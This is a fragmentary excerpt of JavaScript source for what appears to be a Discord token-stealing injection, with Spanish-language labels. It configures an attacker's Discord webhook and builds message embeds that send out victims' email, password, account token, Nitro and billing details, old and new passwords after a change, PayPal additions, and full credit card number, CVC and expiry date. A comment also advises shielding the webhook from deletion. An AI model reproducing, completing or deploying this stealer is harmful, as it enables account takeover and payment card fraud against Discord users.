...
const config = {
  webhook: '&WEBHOOK_URL&', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '<:gr5:996165848911847616> - **Cuenta**',
            value: `Correo: **${email}** - Contraseña: **${password}**`,
            inline: false,
          },
          {
            name: '<a:g3:996165851122241696> - **Informacion de Discord**',
            value: `Tipo de Nitro: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
            inline: false,
          },
          {
            name: '<a:g2:996166260268212354> - <a:g2:996166260268212354> - **Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '<:gr5:996165848911847616> - **Contraseña Cambiada**',
            value: `Correo: **${json.email}**\nContraseña Antigua: **${oldpassword}**\nNueva Contraseña: **${newpassword}**`,
            inline: true,
          },
          {
            name: '<a:g3:996165851122241696> - **Informacion de Discord**',
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '<:gr5:996165848911847616> - **PayPal Agregado**',
            value: `Es hora de comprar nitro jeje **e.e**`,
            inline: false,
          },
          {
            name: '<a:g3:996165851122241696> - **Informacion de Discord**',
          ...
          {
            name: '<a:g2:996166260268212354> - **Token**',
            value: `\`${token}\``,
            inline: false,
          },
        ],
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '<:gr5:996165848911847616> - **Tarjeta de Credito Agregada**',
            value: `Numero: **${number}**\nCVC: **${cvc}**\nExpira: **${expir_month}/${expir_year}**`,
            inline: true,
          },
          {
            name: '<a:g3:996165851122241696> - **Informacion de Discord**',
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '<:gr5:996165848911847616> - **Nitro Comprado/Gifteado**',
            value: `**Codigo:**\n\`\`\`diff\n+ ${code}\`\`\``,
            inline: true,
          },
          {
